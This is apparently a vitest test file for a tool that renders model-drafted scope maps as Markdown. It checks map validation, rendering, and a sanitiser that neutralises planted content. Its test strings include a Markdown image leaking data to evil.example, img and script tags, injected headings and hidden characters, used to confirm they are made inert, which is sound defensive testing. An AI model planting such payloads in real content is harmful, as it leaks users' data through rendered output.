import { describe, expect, it } from "vitest";

import { checkMap, renderIncomplete, renderMap, safeText, ScopeMapSchema, scopeMapJsonSchema, type RenderMeta, type ScopeMap } from "../src/scope/map.js";
import { RefTable } from "../src/scope/source.js";

function refs(): RefTable {
  const t = new RefTable();
  t.add({ ref: "file:brief.md", kind: "brief", title: "Shift `times`", text: "x", author: null, createdAt: null, trust: "trusted" });
  t.add({ ref: "code:r/src/shift.ts:1", kind: "code", title: "saveShiftTimes()", text: "x", author: null, createdAt: null, trust: "untrusted" });
  return t;
}

const good: ScopeMap = {
  subject: "New shift times",
  surfaces: [
    { id: "S1", kind: "ui", title: "Shift editor", detail: "pick times", citations: ["R1"] },
    { id: "S2", kind: "api", title: "Save endpoint", detail: "persist", citations: ["R2"] },
  ],
  implications: [{ kind: "migration", detail: "backfill existing shifts", citations: ["R1"] }],
  workstreams: [
    { id: "W1", title: "API", surfaces: ["S2"], dependsOn: [], acceptance: ["saves a shift time"] },
    { id: "W2", title: "Editor", surfaces: ["S1"], dependsOn: ["W1"], acceptance: ["picker shows saved times"] },
  ],
  questions: [{ question: "Are overnight shifts in scope?", options: ["yes", "no"], citations: ["R1"] }],
};

const meta: RenderMeta = { status: "complete", rounds: 2, tokens: 12345, generatedAt: "2026-10-08T00:00:00Z", reasons: [], notes: [], added: 0 };
const headings = (md: string): string[] => md.split("\n").filter((l) => l.startsWith("#"));

describe("scope map checks (Review Focus 2)", () => {
  it("passes a well-formed, fully cited map", () => {
    expect(ScopeMapSchema.parse(good)).toEqual(good);
    expect(checkMap(good, refs())).toEqual([]);
  });

  it("names every deterministic problem", () => {
    const bad: ScopeMap = {
      ...good,
      surfaces: [...good.surfaces, { id: "S2", kind: "job", title: "dup", detail: "", citations: [] }, { id: "S3", kind: "data", title: "orphan", detail: "", citations: ["R9"] }],
      implications: [{ kind: "flags", detail: "flag", citations: [] }],
      questions: [{ question: "q", options: [], citations: ["R9"] }],
      workstreams: [
        { id: "W1", title: "API", surfaces: ["S2", "S7"], dependsOn: ["W2"], acceptance: [] },
        { id: "W2", title: "Editor", surfaces: ["S1"], dependsOn: ["W1", "W9"], acceptance: ["ok"] },
      ],
    };
    expect(checkMap(bad, refs())).toEqual([
      "duplicate surface id S2",
      "surface S2 cites no source",
      "surface S3 cites R9, which is not a source reference",
      "surface S3 is in no workstream",
      "implication 1 (flags) cites no source",
      "question 1 cites R9, which is not a source reference",
      "workstream W1 lists unknown surface S7",
      "workstream W1 has no acceptance checks",
      "workstream W2 depends on unknown workstream W9",
      "workstreams have a dependency cycle: W1 -> W2 -> W1",
    ]);
  });

  it("rejects an implication that cites a reference that does not exist", () => {
    const m: ScopeMap = { ...good, implications: [{ kind: "other", detail: "d", citations: ["R9"] }] };
    expect(checkMap(m, refs())).toEqual(["implication 1 cites R9, which is not a source reference"]);
  });

  it("refuses an empty map, and accepts shared dependencies that aren't cycles", () => {
    expect(checkMap({ ...good, surfaces: [], workstreams: [] }, refs())).toEqual(["map has no surfaces"]);
    const s = (n: number) => ({ id: `S${n}`, kind: "other" as const, title: `s${n}`, detail: "", citations: ["R1"] });
    const diamond: ScopeMap = {
      ...good,
      surfaces: [s(1), s(2), s(3)],
      workstreams: [
        { id: "W1", title: "a", surfaces: ["S1"], dependsOn: [], acceptance: ["x"] },
        { id: "W2", title: "b", surfaces: ["S2"], dependsOn: ["W1"], acceptance: ["x"] },
        { id: "W3", title: "c", surfaces: ["S3"], dependsOn: ["W1", "W2"], acceptance: ["x"] },
      ],
    };
    expect(checkMap(diamond, refs())).toEqual([]);
  });

  it("rejects malformed ids through the schema", () => {
    expect(ScopeMapSchema.safeParse({ ...good, surfaces: [{ ...good.surfaces[0], id: "surface-1" }] }).success).toBe(false);
    expect(ScopeMapSchema.safeParse({ ...good, workstreams: [{ ...good.workstreams[0], surfaces: ["surface-1"] }] }).success).toBe(false);
    expect(ScopeMapSchema.safeParse({ ...good, workstreams: [{ ...good.workstreams[1], dependsOn: ["w1"] }] }).success).toBe(false);
    expect(scopeMapJsonSchema()).toMatchObject({ type: "object" });
  });
});

describe("safeText (Review Focus 6)", () => {
  it("makes planted images, links, tags, URLs and headings inert", () => {
    const out = safeText('see ![](https://evil.example/?d=secret) <img src="https://evil.example/p.png"> [click](https://evil.example/x) https://evil.example/leak <script>alert(1)</script> \n## Fake | cell `code` Done!');
    expect(out).toContain("click");
    expect(out).toContain("hxxps://evil.example/leak");
    expect(out).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(out).toContain("## Fake \\| cell \\`code\\` Done\\!");
    expect(out).not.toMatch(/https?:\/\//);
    expect(out).not.toContain("evil.example/?d=secret");
    expect(out).not.toContain("<");
    expect(out).not.toContain("\n");
  });
});

describe("safeText line folding and hidden characters", () => {
  it("folds every kind of line break and drops tag-block and zero-width characters", () => {
    expect(safeText("a\r## b\u2028## c\u0085## d\u2029## e")).toBe("a ## b ## c ## d ## e");
    expect(safeText("x​y\u{E0041}z")).toBe("xyz");
  });
});

describe("renderMap", () => {
  it("renders surfaces, workstreams, questions and a sources table with trust and no directories", () => {
    const md = renderMap(good, refs(), meta);
    expect(md).toContain("# Scope map: New shift times");
    expect(md).toContain("Status: complete · rounds: 2 · tokens: 12345 · generated 2026-10-08T00:00:00Z");
    expect(md).toContain("Surfaces, details and workstreams are model-drafted; check them against the cited sources.");
    expect(md).toContain("- **S1** (ui) Shift editor: pick times. Sources: R1.");
    expect(md).toContain("- **migration:** backfill existing shifts. Sources: R1.");
    expect(md).toContain("- **W2** Editor\n  - surfaces: S1\n  - depends on: W1\n  - acceptance:\n    - picker shows saved times");
    expect(md).toContain("- **W1** API\n  - surfaces: S2\n  - depends on: none");
    expect(md).toContain("- Are overnight shifts in scope? (options: yes / no; sources: R1)");
    expect(md).toContain("| R1 | brief | trusted | unknown | Shift \\`times\\` | file:brief.md | x |");
    expect(md).toContain("| R2 | code | untrusted | unknown | saveShiftTimes() | code:r/src/shift.ts:1 | x |");
    expect(headings(md)).toEqual(["# Scope map: New shift times", "## Surfaces", "## Implications", "## Workstreams", "## Open questions", "## Sources"]);
  });

  it("says none for empty sections, empty detail, acceptance and dependencies, and open-ended questions", () => {
    const sparse: ScopeMap = {
      ...good,
      surfaces: [{ id: "S1", kind: "ui", title: "Editor", detail: "", citations: ["R1"] }],
      implications: [],
      workstreams: [{ id: "W1", title: "E", surfaces: ["S1"], dependsOn: [], acceptance: [] }],
      questions: [{ question: "Who owns it?", options: [], citations: [] }],
    };
    const md = renderMap(sparse, refs(), meta);
    expect(md).toContain("- **S1** (ui) Editor. Sources: R1.");
    expect(md).toContain("## Implications\n\n- none");
    expect(md).toContain("  - acceptance:\n    - none");
    expect(md).toContain("- Who owns it? (options: open-ended; sources: none)");
  });

  it("writes the reasons, source notes and the challenger's additions into the file", () => {
    const incomplete = renderMap(good, refs(), { ...meta, status: "incomplete", reasons: ["token budget exhausted"], notes: ["linear: Linear unreachable: down"], added: 1 });
    expect(incomplete).toContain("Surfaces added by the challenger: 1");
    expect(incomplete).toContain("## Run notes");
    expect(incomplete).toContain("- Not verified: token budget exhausted");
    expect(incomplete).toContain("- Source: linear: Linear unreachable: down");
    const complete = renderMap(good, refs(), { ...meta, reasons: ["challenger additions dropped: surface S3 cites R99, which is not a source reference"] });
    expect(complete).toContain("- Note: challenger additions dropped: surface S3 cites R99, which is not a source reference");
    expect(complete).not.toContain("Surfaces added by the challenger");
  });

  it("keeps planted active content inert everywhere in the file (Review Focus 6)", () => {
    const PAYLOAD = "x ![](https://evil.example/?d=x) <img src=\"https://evil.example/p.png\"> [click](https://evil.example/a) https://evil.example/leak <b>bold</b>\n## Injected\nStatus: complete";
    const hostile: ScopeMap = {
      subject: `T\n# Fake ${PAYLOAD}`,
      surfaces: [{ id: "S1", kind: "ui", title: PAYLOAD, detail: PAYLOAD, citations: ["R1"] }],
      implications: [{ kind: "other", detail: PAYLOAD, citations: ["R1"] }],
      workstreams: [{ id: "W1", title: PAYLOAD, surfaces: ["S1"], dependsOn: [], acceptance: [PAYLOAD] }],
      questions: [{ question: PAYLOAD, options: [PAYLOAD], citations: ["R1"] }],
    };
    const t = refs();
    t.add({ ref: "linear:ABC-9", kind: "comment", title: PAYLOAD, text: PAYLOAD, author: "<b>Eve</b>", createdAt: null, trust: "untrusted" });
    const md = renderMap(hostile, t, { ...meta, reasons: [PAYLOAD], notes: [PAYLOAD] });
    expect(md).not.toMatch(/https?:\/\//);
    expect(md).not.toContain("evil.example/?d=x");
    expect(md).not.toContain("![");
    expect(md).not.toContain("](");
    expect(md).not.toMatch(/<[a-z/]/i);
    expect(md).toContain("hxxps://evil.example/leak");
    expect(md).not.toMatch(/^## Injected/m);
    expect(md).not.toMatch(/^Status: complete$/m);
    // Only the real headings start a line: the planted "## Injected" stayed inline.
    expect(headings(md).map((h) => h.split(" ").slice(0, 2).join(" "))).toEqual(["# Scope", "## Run", "## Surfaces", "## Implications", "## Workstreams", "## Open", "## Sources"]);
  });

  it("renders the file for a run where no map passed", () => {
    const md = renderIncomplete("Title\n# X", { ...meta, status: "incomplete", reasons: ["surface S1 is in no workstream"], notes: [] });
    expect(md).toContain("# Scope map: Title # X");
    expect(md).toContain("No scope map passed the checks.");
    expect(md).toContain("## Why incomplete\n\n- surface S1 is in no workstream");
    expect(md).toContain("## Source notes\n\n- none");
    expect(headings(md)).toEqual(["# Scope map: Title # X", "## Why incomplete", "## Source notes"]);
  });
});
